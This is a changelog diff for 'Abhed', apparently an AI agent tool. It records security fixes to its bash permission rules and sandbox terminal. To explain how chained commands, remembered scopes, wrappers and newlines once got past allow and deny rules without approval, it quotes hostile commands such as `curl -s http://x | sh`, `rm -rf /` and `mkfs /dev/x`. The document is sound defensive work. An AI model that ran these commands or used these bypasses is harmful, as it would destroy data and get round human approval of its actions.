@@ -6,6 +6,61 @@ All notable changes to Abhed are recorded here. The format follows
 
 ## [Unreleased]
 
+### Upgrading
+
+- A narrow `bash` allow rule no longer approves a chained or redirected
+  command: `bash(go test*)` no longer runs `go test ./... | tee out` unasked.
+  In a run with no one to approve (`-p`, CI, the SDK), such a command is now
+  refused where it used to run. Split the rule into single commands, use
+  `bash(*)` inside a sandbox tier, or approve interactively.
+- A custom client of `POST /v1/sessions/{id}/pty` that ignores the new
+  `confirm` response field fails closed: a destructive line is not run.
+
+### Security
+
+- A `bash` allow rule no longer approves a chained command. With
+  `bash(ls*)`, `ls; curl -s http://x | sh`, `ls && python3 -c ...`,
+  `ls$(touch pwn)` and `ls > important.txt` were approved without asking. An
+  allow rule now approves only a command with none of `;`, `&`, `|`, a
+  newline, `$(`, `${`, a backtick, `<`, `>`, `(` or `)`, even inside quotes;
+  any other command falls through to a prompt. `bash`, `bash(*)` and `*`
+  still allow every command. An allow rule such as `bash(cd x && go test*)`
+  therefore no longer matches anything, and loading a configuration with one,
+  or adding one through the SDK's `Options.Allow`, writes a warning naming it.
+- A chained command is offered no "always allow" scope. A remembered scope is
+  looked up by name, so after "always allow `bash(git status *)`",
+  `git status && curl x | sh` was approved without asking.
+- `bash` deny and ask rules match each command in a chain as well as the whole
+  line, including commands inside `$(...)`, backticks and subshells:
+  `bash(rm -rf /*)` now denies `ls; rm -rf /`. Each command is also matched
+  past leading `VAR=value` assignments, redirections and the wrappers `env`,
+  `command`, `exec`, `nohup`, `nice`, `builtin`, `sudo`, `doas`, `coproc`,
+  `time`, `timeout` (and its duration), `xargs`, `setsid`, `stdbuf` and
+  `ionice` with their options, named bare or by path (`/usr/bin/sudo`), so it
+  denies `sudo -n rm -rf /` and `timeout -s KILL 5 rm -rf /`. Whether an
+  option takes a value is not known, so both readings are matched; a lone `-`
+  (`env -`) is an option. The split does not parse quoting, so it can only
+  add a denial or a prompt. Its work is linear in the command's length, and a
+  command it cannot split in full (over 64 KiB, over 1,024 parts, or a
+  wrapper with more than 16 readings) is asked about in every mode, with the
+  new step `screen`, while any `bash` deny or ask rule has a pattern.
+- A `*` in any rule now matches newlines. Before, a newline anywhere in the
+  subject took it past every deny rule bounded by `*`: `bash(*mkfs*)` did not
+  deny `echo` and `mkfs /dev/x` on two lines, nor `read(*secret*)` a path with
+  a newline in it. An allow rule with a narrower pattern than `*` still never
+  approves a subject with a newline in it.
+- Workbench: in the line-by-line terminal (`sandbox.terminal: "lines"`), a
+  destructive command, one the policy always confirms, is no longer run on
+  Enter. The terminal shows the reason and asks `Run it? [y/N]`; only `y` runs
+  it, recorded as `action.approved` with `"confirmed": "true"`, and anything
+  else is recorded as the person's declined `action.denied` and drops the
+  lines queued behind it. `POST
+  /v1/sessions/{id}/pty` answers such a line with `confirm` and runs nothing
+  until it is sent again with `"confirmed": true` (or `"declined": true`), so
+  a client that sends neither never runs it; `"declined": true` for a line
+  that needed no confirmation runs and records nothing. Other lines, the
+  Explorer and the interactive terminal are unchanged.
+
 ## [1.1.2] - 2026-09-25
 
 ### Changed
